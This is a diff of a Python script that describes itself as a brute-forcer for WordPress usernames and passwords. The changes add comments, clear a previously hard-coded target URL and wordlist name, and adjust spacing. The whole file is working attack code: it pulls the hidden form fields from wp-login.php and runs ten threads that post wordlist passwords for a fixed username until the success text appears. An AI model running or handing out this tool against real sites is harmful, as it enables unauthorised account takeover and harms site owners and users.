@@ -1,3 +1,7 @@
+'''
+A script that brute the username and password for a Wordpress site
+'''
+# Import needed packages
 from io import BytesIO
 from lxml import etree
 from queue import Queue
@@ -8,10 +12,10 @@ import threading
 import time
 
 SUCCESS = 'Welcome to WordPress!'
-TARGET = "http://boodelyboo.com/wordpress/wp-login.php"
-WORDLIST = 'cain.txt'
+TARGET = "" # Your target here!
+WORDLIST = '' # Your wordlist
 
-
+# Get the words from the wordlist
 def get_words():
     with open(WORDLIST) as f:
         raw_words = f.read()
@@ -21,7 +25,7 @@ def get_words():
         words.put(word)
     return words
 
-
+# Get params from a post
 def get_params(content):
     params = dict()
     parser = etree.HTMLParser()
@@ -32,8 +36,9 @@ def get_params(content):
             params[name] = elem.get('value', None)
     return params
 
-
+# The Bruter
 class Bruter:
+    # Initialize
     def __init__(self, username, url):
         self.username = username
         self.url = url
@@ -42,7 +47,7 @@ class Bruter:
         print("Finished the setup where username = %s\n" % username)
 
     def run_bruteforce(self, passwords):
-        for _ in range(10):
+        for _ in range(10): # Start thread
             t = threading.Thread(target=self.web_bruter, args=(passwords,))
             t.start()
 
@@ -52,21 +57,21 @@ class Bruter:
         params = get_params(resp0.content)
         params['log'] = self.username
 
-        while not passwords.empty() and not self.found:
+        while not passwords.empty() and not self.found: # Try every username and password from the wordlist
             time.sleep(5)
             passwd = passwords.get()
             print(f'Trying username/password {self.username}/{passwd:<10}')
             params['pwd'] = passwd
             resp1 = session.post(self.url, data=params)
-            
-            if SUCCESS in resp1.content.decode():
+
+            if SUCCESS in resp1.content.decode(): # If you got the correct one...
                 self.found = True
                 print(f"\nBruteforcing successful.")
                 print("Username is %s" % self.username)
                 print("Password is %s\n" % passwd)
                 self.found = True
 
-
+# Start the bruter
 if __name__ == '__main__':
     b = Bruter('tim', TARGET)
     words = get_words()
